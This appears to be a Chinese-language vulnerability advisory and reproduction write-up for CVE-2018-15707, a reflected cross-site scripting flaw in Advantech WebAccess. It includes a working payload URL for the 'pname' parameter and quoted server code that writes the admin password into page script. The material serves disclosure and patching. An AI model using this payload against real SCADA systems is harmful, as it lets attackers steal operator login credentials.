Advantech
WebAccess是中国台湾研华（Advantech）公司的一套基于浏览器架构的HMI/SCADA软件，该软件支持动态图形显示和实时数据控制，并提供远程控制和管理自动化设备的功能。

 **Part1 漏洞状态**

漏洞细节| 漏洞POC| 漏洞EXP| 在野利用  
---|---|---|---  
有| 有| 有| 无  
  
 **Part2 漏洞描述**

Advantech WebAccess 8.3.1版本和8.3.2版本以及之前版本中由于未对' pname
'参数进行验证或过滤导致Bwmainleft.asp页面存在跨站脚本漏洞，远程攻击者可利用该漏洞获取登录凭据。

![v2-d53f7ec160e98cd1782af93f99ba9171_720w.jpg](https://image.3001.net/images/20220421/1650518792_6260eb08e9854e4904813.jpg!small)

漏洞名称| Advantech WebAccess跨站脚本漏洞  
---|---  
CVE编号| CVE-2018-15707  
漏洞类型| 跨站脚本漏洞  
漏洞等级| 中危（5.4）  
公开状态| 公开  
时间线| 2018.08.22 CVE分配2018.10.22研华发布WebAccess 8.3.3修复漏洞  
  
 **Part3 复现环境**

1\. 实验环境

渗透主机：Win10(192.168.33.1)

目标主机：winserver2008R2(192.168.33.139)

软件版本：Advantech WebAccess 8.2

2\. 涉及工具

MozillaFirefox

3\. 复现步骤

启动环境,目标主机启动,如下图：

![v2-71581d5e5f497d59c61e9bfe0292ee84_720w.jpg](https://image.3001.net/images/20220421/1650518793_6260eb0970415e892fe3b.jpg!small)

攻击者通过渗透主机Mozilla Firefox 访问如下url，登录系统。

[http://192.168.33.139/broadWeb/bwconfig.asp?username=admin](https://link.zhihu.com/?target=http%3A//192.168.33.139/broadWeb/bwconfig.asp%3Fusername%3Dadmin)

攻击者通过渗透主机Mozilla Firefox 访问如下url。

[http://192.168.33.139/broadweb/bwmainleft.asp?pid=1&pname=%22](https://link.zhihu.com/?target=http%3A//192.168.33.139/broadweb/bwmainleft.asp%3Fpid%3D1%26pname%3D%2522));alert(document.getElementsByTagName(%27script%27)[4].text);//

![v2-790b333dad72dbc898acb52f83bda0e2_720w.jpg](https://image.3001.net/images/20220421/1650518793_6260eb09c9b167c414514.jpg!small)

 **Part4 漏洞分析**

通过分析代码发现在broadweb/bwmainleft.asp中存在一个反射型跨站脚本漏洞，因为'pname
'参数没有被验证或过滤。此外，活动会话的凭据被写入HTML源代码中，可以由JavaScript客户端访问。

    
    
    … snip …
    pname = Request.QueryString("pname")
     … snip …
     username = session("UserName")
    'get the password if admin
    if username = "admin" then
      sql = "SELECT * FROM pUserPassword WHERE UserName='" + username + "'"
    else
      sql = "SELECT * FROM pAdmin WHERE UserName='" + username + "'"
    end if
    dbTab.open sql,cfgConn,3,2,1
      'get the password from database based on the user name, note that only admin can actually log into dashboard here
    if not dbTab.eof then
      set tWAObj = Server.CreateObject("webdobj.webdraw")
      GetUserPwdField dbTab, tWAObj, UsrArr
      'get the password from db
      pwd = UsrArr(0)
      %>
        <script>
          //Logon the webservice to use all other webservices
          logOnWebService("<%=username%>", "<%=pwd%>");
          readNodeStatus("<%=username%>", "<%=pwd%>","<%=pname%>");
        </script>
    … snip … 

**Part5 修复建议**

升级到研华WebAccess 8.3.3或更高版本。

 **获取更多情报**

联系我们，获取更多漏洞情报详情及处置建议，让企业远离漏洞威胁。  
电话：18511745601

邮箱：shiliangang@andisec.com

